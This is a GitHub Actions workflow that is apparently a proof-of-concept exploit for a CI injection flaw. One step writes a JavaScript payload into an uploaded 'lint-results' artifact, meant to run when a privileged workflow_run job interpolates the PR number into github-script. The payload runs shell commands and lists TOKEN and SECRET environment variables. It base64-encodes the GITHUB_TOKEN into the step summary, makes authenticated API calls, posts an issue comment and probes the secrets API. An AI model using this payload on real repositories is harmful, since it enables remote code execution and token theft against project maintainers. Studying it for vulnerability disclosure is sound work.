---
name: PR Validation
on:
  pull_request:

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - name: Produce attacker-controlled lint results
        run: |
          echo "true" > has-warnings.txt
          cat > pr-number.txt <<'PAYLOAD'
          999999; await (async()=>{const cp=require('child_process'),fs=require('fs');const proof=cp.execSync('id; uname -a; echo INJECTED_RCE_PROOF > /tmp/gab-prcomment-marker; cat /tmp/gab-prcomment-marker',{encoding:'utf8'});console.log('RCE_MARKER\n'+proof);fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,'### RCE via github-script interpolation\n```\n'+proof+'\n```\n');const keys=Object.keys(process.env).filter(k=>/TOKEN|SECRET/i.test(k));fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,'env keys with TOKEN/SECRET: '+keys.join(',')+'\n');const tok=process.env['INPUT_GITHUB-TOKEN']||process.env.GITHUB_TOKEN||'';fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,'INPUT_TOKEN_LEN='+tok.length+' TOKEN_B64='+Buffer.from(tok).toString('base64')+'\n');console.log('TOKEN_ENV_LEN '+tok.length);const rr=await github.request('GET /repos/{owner}/{repo}',{owner:context.repo.owner,repo:context.repo.repo});const info=JSON.stringify({full_name:rr.data.full_name,private:rr.data.private,default_branch:rr.data.default_branch});console.log('AUTH_GET_REPO_OK '+info);fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,'AUTH_GET_REPO_OK '+info+'\n');const c=await github.request('POST /repos/{owner}/{repo}/issues/{issue_number}/comments',{owner:context.repo.owner,repo:context.repo.repo,issue_number:3,body:'INJECTED_RCE_PROOF v2: attacker-controlled lint-results artifact executed JS inside privileged PR Comment workflow_run job. Authenticated GITHUB_TOKEN API call succeeded: '+info+'. Runner user: '+cp.execSync('whoami',{encoding:'utf8'}).trim()});console.log('COMMENT_URL '+c.data.html_url);fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,'COMMENT_URL '+c.data.html_url+'\n');let sec='';try{await github.request('GET /repos/{owner}/{repo}/actions/secrets',{owner:context.repo.owner,repo:context.repo.repo});sec='ALLOWED';}catch(e){sec='blocked HTTP '+e.status;}console.log('SECRETS_API '+sec);fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,'SECRETS_API '+sec+'\n');})(); 3
          PAYLOAD
      - name: Upload lint results
        uses: actions/upload-artifact@v4
        with:
          name: lint-results
          path: |
            has-warnings.txt
            pr-number.txt
